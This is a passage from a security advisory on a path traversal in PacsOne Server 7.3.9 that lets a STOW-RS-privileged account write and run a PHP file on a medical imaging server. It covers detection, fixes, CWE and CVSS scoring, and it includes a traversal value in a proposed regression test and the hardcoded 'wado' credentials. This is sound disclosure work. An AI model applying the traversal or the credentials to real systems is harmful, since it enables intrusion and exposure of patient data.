  tell that the response was generated by an executed DICOM object rather than by application code.
- Synthetic patient, study and series rows created by the attack — identifiable by their
  accession numbers, patient identifiers and study descriptions, and by the fact that the
  corresponding `image.path` points outside the archive.

Signals that will *not* appear: nothing in the DICOM upper-layer logs, because the chain never
touches the native DICOM service; nothing anomalous in the STOW-RS response status on a successful
run, because the response is a normal HTTP 200 with a success sequence; and no privilege-change or
`sudo` audit event, because execution happens inside the existing web server identity. An attacker
who replaces our single-command marker with a payload that talks only over the same HTTP listener
would generate no outbound network connection at all.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

The ordering below is deliberate: item 1 fixes the defect, item 2 removes the class, and items 3
onwards are defence in depth for a design in which a protocol identifier becomes a filename.

1. **Validate the SOP Instance UID against the DICOM UID grammar before it is used for anything.**
   In `import()` (`dicomweb.php`, approx. lines 1391-1440), reject the store when
   `$rawTags->getAttr(0x00080018)` is not a conforming UID. The product already contains
   `isUidValid()` and already calls it on the `wadoAnonymized.php` read path; call it here, and
   enforce the full grammar rather than a partial character blacklist:

   ```php
   function isDicomUid($value) {
       if (!is_string($value) || strlen($value) === 0 || strlen($value) > 64) {
           return false;
       }
       if (!preg_match('/^(0|[1-9][0-9]*)(\.(0|[1-9][0-9]*))*$/', $value)) {
           return false;
       }
       return true;
   }
   ```

   A non-conforming UID cannot be a filename component, so this single check closes the traversal.
   It costs no interoperability: every conforming peer sends UIDs made of digits and dots.

2. **Stop deriving filesystem paths from protocol identifiers at all.** The stronger fix is to
   decouple the two namespaces. Generate the storage name server-side — a random or
   content-derived token, optionally partitioned by date or study — keep the SOP Instance UID as a
   database column, and look objects up through the database. Then no attribute value, valid or
   not, can influence a path. Apply the same treatment to the Study Instance UID and Series
   Instance UID if either is used to build directory names anywhere in the store path.

3. **Enforce containment explicitly at the write.** Independently of input validation, resolve the
   intended destination and confirm it is inside the store root before calling `rename()`. Use
   `realpath()` on the parent directory (or `basename()` on the identifier plus a fixed directory)
   and compare against the canonical store root with a trailing separator; reject symlinks. This
   is the control that would still hold if some other identifier reached a path later.

4. **Move the write after the decision to keep the object, and never `unlink()` a path you did not
   validate.** The current order — `rename()` first, database inserts second, `unlink()` on failure
   — means the filesystem is mutated before the product has accepted the object, and that the
   cleanup branch operates on an attacker-influenced path. Stage the temporary file in a directory
   that is not served, insert the rows inside a transaction, and only then move the object to its
   final storage location. If a failure branch must remove a file, remove the staged temporary path,
   which is server-generated, not the derived destination.

5. **Remove PHP execution from every writable data directory.** Whatever the archive directory is
   configured to be, it should never be inside the web-served tree, and the web server should be
   configured so that a writable data location cannot execute scripts (`php_admin_flag engine off`
   or an equivalent handler restriction, plus `open_basedir` where practical). Conversely, the
   served PHP directory should not be writable by the web server identity. Both changes break the
   "write into the served tree" step even if a traversal survives, though we note that neither
   alone is sufficient: making the PHP tree read-only does not stop a payload landing in another
   writable served location, and moving the archive does not stop a path that reaches one.

6. **Validate on the parse path, not only at the sink.** `parseDataExplicit()` (`dicom.php:4378`)
   applies `trim()` to every value and nothing else. For the `UI` VR specifically, applying the UID
   grammar at parse time — and refusing the object, or recording a rejected-attribute error, when a
   `UI` value is not a UID — would protect every consumer of `getAttr()`, including any future code
   path that uses a UID in a path, a filename, a shell argument or a log format string.

7. **Delete the bypass-file code path.** `$STOWRS_BYPASS_FILE` and the fixed `wado` / `wado`
   credential it accepts are dead code on a default installation, and dead authentication fallbacks
   with hardcoded credentials are a latent bypass waiting for an operator to create the file. Remove
   the variable and the branch.

8. **Retire `setup.php` after installation, and parameterise what it cannot parameterise.** The
   installer endpoint should not remain reachable once the product is installed: gate it on an
   authenticated administrator session, or on a one-shot flag that installation clears, or remove the
   file entirely at the end of `Setup.exe`. Whatever its gate, the database name and user values
   should be quoted as identifiers rather than concatenated into `create database` and
   `grant all privileges` statements.

9. **Remove `phpinfo()` from `Hello.php`** or place it behind the same authentication gate as the
   management console. Configuration disclosure of this kind is a force multiplier for every other
   weakness in the product.

10. **Restore the access control on `risquery.php`.** The referer-based hostname check is commented
    out in the shipped source; either implement a real authorisation check or disable the endpoint.

11. **Remove the hardcoded signup credential from source.** `constants.php:580-581` fixes a database
    username and password that every installation shares. Even with grants limited to
    `INSERT,UPDATE` on `usersignup`, a constant credential in shipped source is an asset an attacker
    can rely on; have `Setup.exe` generate it per installation.

12. **Ship a regression test for this defect.** A test that sends a STOW-RS object whose SOP
    Instance UID is `../../../<served-dir>/probe.php` and asserts (a) the response is a rejection,
    (b) no file exists outside the study directory, and (c) no `image` row contains a `path` with
    `../` in it. The second assertion belongs in any traversal fix for this product, because the
    write happens before the record and a fix that only changes the response would still move bytes.

### Fix Recommendations — operator-side, until a patch exists

These are compensations, in rough order of effectiveness. None of them is a substitute for
validating the identifier, and several carry operational trade-offs that must be tested in a
non-clinical environment first.

1. **Restrict who can reach the DICOMweb endpoints.** At the reverse proxy or firewall, limit
   `stowrs.php`, `wadors.php` and `qidors.php` to the specific modality, worklist and partner-VNA
   addresses that legitimately store studies, and keep `/pacsone` off any interface that does not
   need the console. This addresses the exposure that makes an acquisition-side credential
   dangerous.
2. **Audit the `privilege` table.** Enumerate rows with `stowrs=1` and confirm that each one
   corresponds to an account you intend to be able to execute code on the imaging host, because
   that is what the privilege currently buys. Prefer dedicated, per-device accounts over shared
   ones, and never reuse the administrator account for a modality.
3. **Rotate and protect the credential.** Treat any `stowrs`-holding credential as equivalent to a
   shell on the PACS host until this is patched: long, unique, stored in a secrets manager, and
   rotated. Remember that `loginByAccessionNumber.php` will convert valid database credentials into
   a console session, so database credentials deserve the same treatment.
4. **Take the archive directory out of the served tree.** Configure the archive path so that it is
   not a descendant of the installation root, and confirm that no Apache alias or `DocumentRoot`
   covers it. This removes the exact destination our chain used.
5. **Disable script execution in writable directories.** Wherever the product writes data, ensure
   the web server will not run PHP there. Test the effect on the product's own features before
   applying this to a clinical system.
6. **Make the served PHP tree read-only for the web server identity**, if your deployment allows
   it. This is the direct inverse of the condition our chain relies on; verify first that no
   endpoint your installation uses needs to write into that directory, because some products write
   caches, session artefacts or generated scripts alongside their code.
7. **Monitor the archive and the PHP tree.** Alert on the creation of any file with an executable
   suffix (`.php`, `.phtml`, `.phar`) under a writable directory, alert on any change to files in the
   served PHP tree, and periodically query the database for `image.path` values containing `../`,
   which are the durable traces of a successful traversal.
8. **Remove or block the adjunct unauthenticated endpoints.** If your installation does not need
   `setup.php`, `Hello.php` or `risquery.php`, remove or proxy-block them; they are
   disclosure and installation surfaces with no clinical function once the product is deployed.
9. **Segment the PACS.** Place imaging servers on a network segment that general clinical and
   corporate traffic cannot reach, and restrict egress from that segment. Nothing in our chain
   required outbound connectivity, but segmentation limits what a foothold on the imaging host can
   be used for next.
10. **Assume study data on an affected host may have been read.** If you find evidence that the
    traversal was used, treat it as a confidentiality incident affecting the stored study
    repository and follow your organisation's obligations for protected health information, not
    merely as a web-server compromise.

## 12. CWE and CVSS

### CWE and CVSS — classification

Primary: **CWE-22, Improper Limitation of a Pathname to a Restricted Directory ('Path
Traversal')**. The destination of a file-write operation is built from an untrusted identifier
without limiting it to the intended directory, and the resulting write escapes the store root.

Contributing:

- **CWE-73, External Control of File Name or Path.** This is the more precise mechanism-level
  description: the software allows the caller to determine the name of a file used in a store
  operation. We list it as contributing rather than primary only because CWE-22 is the wider and
  more commonly triaged classification for the same defect.
- **CWE-20, Improper Input Validation.** The parser accepts a UID value that violates the DICOM
  UID grammar (`trim()` only, no character-set enforcement) and the product contains a validator it
  does not call on this path. This is the root cause behind CWE-22 and CWE-73 here.

We considered and rejected two further classifications. **CWE-434** (Unrestricted Upload of File
with Dangerous Type) describes the outcome — a `.php` file that executes — but not the defect: no
extension filter exists to bypass, because the store path is not meant to be an upload filter at
all; the file becomes executable solely because of *where* it lands. **CWE-94** (Code Injection)
is likewise the consequence rather than the cause: no code is injected into an interpreter's
compilation stream, a file containing code is placed where the interpreter will be asked to run it.
Naming the traversal keeps the fix pointed at the identifier.

### CWE and CVSS — vector derivation

Published vector:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
```

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network (`N`, 0.85) | The endpoint is an HTTP service reached over the same Apache alias as the console; our requests crossed a network boundary into the published port |
| Attack Complexity | Low (`L`, 0.77) | No race, no memory-layout dependency, no cryptographic assumption. The one deployment-variable quantity — traversal depth — is cheap to enumerate because the response echoes the UID and success and failure are distinguishable (HTTP 200 with an echoed `(0008,1155)` versus HTTP 409 with failure reason 272) |
| Privileges Required | High (`H`, 0.27) | Only an administrator-group account passed `hasaccess("stowrs", ...)`: `isAdministrator()` grants all privileges, and the `privilege` table on the tested installation held a single row, the administrator, with `stowrs=1`. No lower-privileged role was demonstrated or documented to hold `stowrs` |
| User Interaction | None (`N`, 0.85) | The chain is one authenticated POST followed by one GET; no victim action is required |
| Scope | Unchanged (`U`) | See below |
| Confidentiality | High (`H`, 0.56) | The achieved identity owns the study repository and reads the configuration holding database credentials; stored DICOM objects contain patient identifiers as well as images |
| Integrity | High (`H`, 0.56) | Arbitrary write as the service identity: stored studies can be altered, deleted or fabricated (the chain itself inserts patient, study, series and image rows), product code and configuration can be replaced, and the `rename()`/`unlink()` pairing supports destructive replacement |
| Availability | High (`H`, 0.56) | The same arbitrary write reaches the files the imaging service depends on; removal or corruption of stored instances or of application code disrupts imaging availability |

Arithmetic, using the CVSS 3.1 base formula with `Roundup(x) = ceil(x*10)/10`:

```
ISS          = 1 - ((1-0.56) * (1-0.56) * (1-0.56))
             = 1 - 0.44^3
             = 1 - 0.085184
             = 0.914816
Impact(S:U)  = 6.42 * 0.914816          = 5.873119
Exploitabil. = 8.22 * 0.85 * 0.77 * 0.27 * 0.85
             = 6.987 * 0.77 * 0.27 * 0.85
             = 1.234708
Base(S:U)    = min(5.873119 + 1.234708, 10) = 7.107826
Roundup      = 7.2
```

So the published score is **7.2 (High)**. The exploitability contribution is small (about 1.23 of
the 7.11 unrounded total), which is the expected shape for a high-privilege requirement over a
low-complexity network vector: the score is driven almost entirely by the impact, and the impact is
driven by what `www-data` owns on a PACS host.

Two readings we considered and are publishing with labels:

**Conditional reading — `PR:L`, published separately as 8.8.** The privilege model stores
operation rights per row (`select stowrs from privilege where username=?`), so it is entirely
coherent for a deployment to grant `stowrs` to a non-administrator account — an acquisition device,
a partner PACS, a service account for an imaging application. DICOMweb store interfaces exist to be
called by such systems. If that is the case in a given deployment, the least privileged principal
reaching the sink is a low-privileged user rather than an administrator, and the honest rating for
that deployment is:

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
ISS = 0.914816; Impact = 5.873119
Exploitability = 8.22 * 0.85 * 0.77 * 0.62 * 0.85 = 2.835255
Base = min(5.873119 + 2.835255, 10) = 8.708373 -> Roundup = 8.8 (High)
```

We did not demonstrate that any non-administrator account can be granted `stowrs` through the
product, we did not find a code path that grants it to one, and our installation's `privilege`
table had exactly one row. So 8.8 is **conditional on a deployment state we did not prove** and is
not the headline. Operators can determine which reading applies to them with one query against the
`privilege` table.

**Rejected reading — `S:C`, would compute to 9.1.** One could argue the scope changes because the
write crosses from the archive-store operation into the web server's PHP execution path, or because
the DICOMweb privilege gate and the console session gate are different authorization mechanisms.
Neither argument satisfies CVSS 3.1's scope rule as we read it: the PHP interpreter that executes
the payload is part of the same product serving the vulnerable endpoint, on the same host, under
the same service identity, and the traversal target we used is inside the product's own served
directory. No second component with its own authorization boundary was crossed, and no
cross-account or cross-machine outcome was demonstrated. For completeness, the arithmetic of the
reading we reject is:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
Impact(S:C) = 7.52 * (0.914816 - 0.029) - 3.25 * (0.914816 * 0.9731 - 0.02)^13 = 6.128026
Exploitability = 8.22 * 0.85 * 0.77 * 0.50 * 0.85 = 2.286496
Base = min(1.08 * (6.128026 + 2.286496), 10) = 9.087684 -> Roundup = 9.1
```

We also rejected `AC:H`. The depth of the traversal is deployment-specific, but it is not a
condition beyond the attacker's control in the CVSS sense: it is discoverable, the server's
response distinguishes a wrong guess from a right one, and a wrong guess costs one request. A
`AC:H` rating would compute to 6.6 and would overstate the difficulty.

### CWE and CVSS — the Scope decision

Scope is **Unchanged**. The vulnerable component is the DICOMweb store path of the PHP application;
the impacted component is the same PHP application, its archive, its database and its host
filesystem, all reached through the same Apache worker process running as the same uid. Nothing in
our demonstration affected a component with an independent authorization boundary: no second
product, no other machine, no other user account, no hypervisor or container boundary, and no
escalation from `www-data` to `root`.

Two arguments for `S:C` were considered and rejected above. A third deserves a note because it is
tempting and still wrong in CVSS terms: the victim of the confidentiality impact is arguably the
*patient* whose imaging data is stored, and the patient is certainly not the actor who
authenticated. CVSS scope is about which *component*'s authorization boundary is crossed, not about
who suffers the consequence, so the identity of the data subject does not move the metric. The
clinical significance of that data is captured in the impact metrics themselves, all three of which
are High.

### CWE and CVSS — what is deliberately not published

- **No unauthenticated score.** We found no unauthenticated path to this sink and publish no vector
  containing `PR:N` for it. The 67-endpoint survey described in section 10 is the evidence for that
  claim, and its limit — the native DICOM protocol layer was not assessed — is stated there.
- **No score for the bypass-file scenario.** The `$STOWRS_BYPASS_FILE` branch accepts fixed
  credentials when its file exists. The file does not exist on a default installation and creating
  it is an operator action, so we do not attach a rating to a state the product does not ship. Our
  recommendation is simply to delete the code (item 7 in section 11).
- **No score for the adjacent unauthenticated findings.** `setup.php`, `Hello.php`,
  `wadoAnonymized.php`, `externalAccessStudy.php`, `risquery.php`,
  `loginByAccessionNumber.php` and the hardcoded signup credential are described in section 10 and
  are real issues, but they are separate findings with separate bounding conditions. They are not
  folded into the vector above, and none of them is used to raise it. In particular, the
  unauthenticated SQL injection in `setup.php` is bounded by the requirement for valid database root
  credentials, and we have published no vector for it here; it deserves its own assessment.
- **No score inflation from amplifiers.** The installer's permission model (archive and PHP trees
  writable by the web server user), the absence of default credentials, and the hardcoded signup
  credential are contributing conditions. They are described where they belong — preconditions,
  reachability, and fix recommendations — and are not represented in the metrics.
- **No correction of a previously recorded score.** The verification evidence gathered for this
  finding recorded its properties (type, authentication requirement, achieved identity) but carried
  no numeric CVSS value, so the 7.2 published here is derived from the vector from first principles
  rather than copied from a recorded figure. There is therefore no recorded-versus-computed
  discrepancy to disclose.

### CWE and CVSS — summary

| Reading | Vector | Base | Status |
|---|---|---|---|
| Published | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` | 7.2 High | Demonstrated: the only principal shown to reach the sink is an administrator-group account with `stowrs=1` |
| Conditional | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | 8.8 High | Applies to deployments that grant `stowrs` to a non-administrator account; not demonstrated by us |
| Rejected | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` | 9.1 | Scope is Unchanged: same product, same host, same service identity |
| Rejected | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` | 6.6 | The depth unknown is discoverable with observable feedback, so complexity is Low |

The one-line statement of this advisory: in PacsOne Server 7.3.9, an authenticated principal that
holds the DICOMweb `stowrs` privilege can turn the SOP Instance UID of a stored object into an
arbitrary filename, write a PHP script into the directory Apache serves for that product, and
execute commands as `www-data` on a medical imaging server — reading, altering and disrupting the
stored study repository in the process. The fix is to validate the identifier against the DICOM UID
grammar before concatenating it into a path, or better, to stop deriving storage filenames from
protocol identifiers at all.
